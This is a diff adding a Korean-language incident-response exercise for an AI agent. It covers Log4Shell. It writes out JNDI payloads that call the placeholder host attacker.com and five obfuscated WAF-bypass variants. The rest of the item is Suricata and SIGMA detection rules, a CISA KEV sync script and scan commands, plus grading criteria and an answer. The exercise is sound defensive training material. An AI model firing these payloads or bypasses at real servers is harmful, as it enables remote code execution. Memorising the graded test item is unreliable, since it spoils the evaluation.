@@ -536,3 +536,140 @@ steps:
     cat ~/w06/shadow-it.md'
   risk_level: low
   bastion_prompt: Shadow IT 스캔
+- order: 100
+  instruction: '[Multi-task] N-day Log4Shell IR 5단계 통합 — 페이로드 → 변형 → SIGMA → CISA KEV → Shadow IT.'
+  bastion_prompt: |
+    N-day 대규모 악용 (Log4Shell 계열) IR 5단계 chain 을 한 흐름으로 수행해줘.
+
+    1) [Log4Shell 페이로드 예시] mkdir -p ~/w06; cat > ~/w06/log4shell-base.txt <<EOF
+       === Log4Shell (CVE-2021-44228) 기본 페이로드 ===
+       \${jndi:ldap://attacker.com/Exploit}
+       \${jndi:rmi://attacker.com:1099/Exploit}
+       \${jndi:dns://attacker.com/x}
+
+       위치: User-Agent, Referer, X-Api-Version, X-Forwarded-For, body 등 어디든
+       Log4j 의 lookup 매개변수로 들어가는 모든 곳
+       EOF
+       cat ~/w06/log4shell-base.txt. CVE-2021-44228 + MITRE T1190 매핑.
+
+    2) [변형 페이로드 5종 (우회)] cat > ~/w06/log4shell-bypass.txt <<EOF
+       === Bypass Variants ===
+       1. Nested:        \${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://x/y}
+       2. Upper/lower:   \${jNdI:lDaP://x/y}
+       3. Env wrap:      \${env:USERNAME:-\${jndi:ldap://x/y}}
+       4. Sys prop:      \${sys:JAVA_HOME:-\${jndi:ldap://x/y}}
+       5. URL encoding:  %24%7Bjndi%3Aldap%3A%2F%2Fx%2Fy%7D
+
+       WAF blacklist 단순 jndi 차단 우회 가능. ModSec CRS 의 942100 이 4종 만 매칭.
+       EOF
+       cat ~/w06/log4shell-bypass.txt.
+
+    3) [Suricata + SIGMA 룰] cat > ~/w06/log4shell.rules <<EOF
+       # Suricata
+       alert tcp any any -> \$HOME_NET any (msg:"Log4Shell JNDI"; content:"\${jndi:"; nocase;
+       sid:1000401; rev:1; classtype:web-application-attack;)
+       alert tcp any any -> \$HOME_NET any (msg:"Log4Shell JNDI obfuscated"; pcre:"/\\\$\\\{[a-zA-Z]*\\\$\\\{::/i";
+       sid:1000402; rev:1;)
+       EOF
+       cat > ~/w06/sigma-log4shell.yml <<EOF
+       title: Log4Shell JNDI Lookup Pattern
+       id: 00000000-0000-0000-0000-000000000006
+       logsource:
+         product: apache
+         category: webserver
+       detection:
+         selection:
+           cs-uri|contains:
+             - '\${jndi:'
+             - '\${jNdI'
+             - '\${\${'
+         condition: selection
+       level: critical
+       tags: [attack.t1190, cve.2021-44228]
+       EOF
+       cat ~/w06/log4shell.rules; cat ~/w06/sigma-log4shell.yml.
+
+    4) [CISA KEV 구독 + auto sync] cat > ~/w06/kev-sync.sh <<EOF
+       #!/bin/bash
+       # CISA KEV (Known Exploited Vulnerabilities) 일일 sync
+       curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \
+         > /tmp/kev.json
+       jq '.vulnerabilities[] | select(.dateAdded >= "2024-01-01") |
+           {cve: .cveID, name: .vulnerabilityName, product: .product, vendor: .vendorProject,
+            knownRansomware: .knownRansomwareCampaignUse}' /tmp/kev.json | head -50
+       echo "Total KEV entries: \$(jq '.vulnerabilities | length' /tmp/kev.json)"
+       echo "Recent (last 30 days): \$(jq '[.vulnerabilities[] | select(.dateAdded >=
+         \"$(date -d '30 days ago' +%Y-%m-%d)\")] | length' /tmp/kev.json)"
+       EOF
+       chmod +x ~/w06/kev-sync.sh; cat ~/w06/kev-sync.sh; (bash ~/w06/kev-sync.sh 2>&1 || echo "offline:
+       의사 결과") | head -10.
+
+    5) [Shadow IT 스캔 + 종합 권고] cat > ~/w06/shadow-it.md <<EOF
+       # Shadow IT 스캔 + N-day 방어 종합
+
+       ## Shadow IT 스캔 (운영자 미지의 Java 자산)
+       명령:
+       \`\`\`bash
+       # Linux: 모든 Java process + Log4j 의존성 검사
+       ssh ccc@{{WEB_IP}} 'sudo find / -name "log4j-core-*.jar" 2>/dev/null | xargs -I{} echo {}'
+       ssh ccc@{{WEB_IP}} 'sudo ps -ef | grep java | awk "{print \\\$NF}" | sort -u'
+
+       # Container: Trivy 의 image scan
+       trivy image --severity HIGH,CRITICAL myapp:latest
+       \`\`\`
+
+       ## N-day 방어 5 layer
+       1. Asset inventory 자동화 (CMDB + Shadow IT scan 주 1회)
+       2. CISA KEV daily sync + SIEM rule auto-deploy
+       3. WAF Paranoia Level 3+ (Log4Shell + obfuscated variant 차단)
+       4. Egress allowlist (outbound LDAP/RMI/DNS 차단 - JNDI lookup 차단)
+       5. Patch tier prioritization (KEV 의 CVE 7일 내 패치)
+
+       ## MTTM (Mean Time To Mitigate) 목표
+       - Critical KEV: 24h
+       - High: 7 days
+       - Medium: 30 days
+       EOF
+       cat ~/w06/shadow-it.md.
+
+    cleanup: rm -rf ~/w06 /tmp/kev.json.
+
+    마지막에 5단계 × (N-day IR 단계 / 명령 / 결과 / CVE 매핑 / 방어 layer / 운영 권고) 의 5×6 매트릭스 +
+    N-day Defense Playbook (Shadow IT scan + KEV sync + WAF L3 + egress allowlist + KEV tier) markdown +
+    cleanup 검증 출력.
+  hint: N-day Log4Shell 5단계 chain. KEV sync + Shadow IT scan + Egress allowlist 가 핵심.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] N-day Log4Shell IR 5단계 — 페이로드/변형/SIGMA/KEV/Shadow IT. CVE-2021-44228 + MITRE T1190 + CISA KEV 매핑 + 5×6 매트릭스 + N-day Defense Playbook.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - 변형 페이로드 5종
+      - Suricata + SIGMA 룰 둘 다
+      - KEV sync script
+      - Shadow IT scan 명령
+      - 방어 5 layer
+      - cleanup
+      - 5×6 매트릭스 + Playbook
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - cat heredoc + jq + bash 표준
+      - Suricata / SIGMA / Trivy 양식
+      - markdown 매트릭스 + Playbook
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - 변형 3종 이하
+      - KEV sync 누락
+      - cleanup 미수행
+      - 매트릭스 6 컬럼 미만
+  target_vm: bastion
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. N-day Log4Shell 5단계 + 5×6 매트릭스 + N-day Defense Playbook + cleanup.
+  answer_detail: |
+    Vulnerability Management Engineer 페르소나 — N-day mass exploit IR chain. KEV + Shadow IT + Egress.
+  script: ''
